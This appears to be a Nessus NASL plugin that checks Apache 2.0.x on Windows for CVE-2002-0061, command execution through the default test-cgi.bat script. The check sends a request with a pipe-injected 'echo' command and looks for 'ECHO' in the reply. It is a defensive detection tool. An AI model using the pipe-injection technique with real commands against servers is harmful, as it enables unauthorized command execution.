#
# This script was written by Matt Moore <matt@westpoint.ltd.uk>
#


if(description)
{
 script_id(10938);
 script_bugtraq_id(4335);
 script_version("$Revision: 1.14 $");
 script_cve_id("CVE-2002-0061");
 name["english"] = "Apache Remote Command Execution via .bat files";
 script_name(english:name["english"]);
 
 desc["english"] = "
The Apache 2.0.x Win32 installation is shipped with a 
default script, /cgi-bin/test-cgi.bat, that allows an attacker to execute 
commands on the Apache server (although it is reported that any .bat file 
could open this vulnerability.)
 
An attacker can send a pipe character '|' with commands appended as parameters, 
which are then executed by Apache.

Solution: 

This bug is fixed in 1.3.24 and 2.0.34-beta, or remove /cgi-bin/test-cgi.bat


Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for presence of Apache Command Execution via .bat vulnerability";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Matt Moore");
 family["english"] = "Web Servers";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/apache");
 exit(0);
}

# Check makes request for cgi-bin/test-cgi.bat?|echo - which should return
# an HTTP 500 error containing the string 'ECHO is on'
# We just check for 'ECHO' (capitalized), as this should remain the same across
# most international versions of Windows(?)

include("http_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port)){ exit(0); }

if ( get_kb_item("Services/www/" + port + "/embedded") ) exit(0);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "Apache" >!< sig ) exit(0);

soc = http_open_socket(port);
if (!soc) exit(0);

req = http_get(item:"/cgi-bin/test-cgi.bat?|echo", port:port);
send(socket:soc, data:req);
res = http_recv(socket:soc);
http_close_socket(soc);
if ("ECHO" >< res)
{
    security_hole(port:port);
}
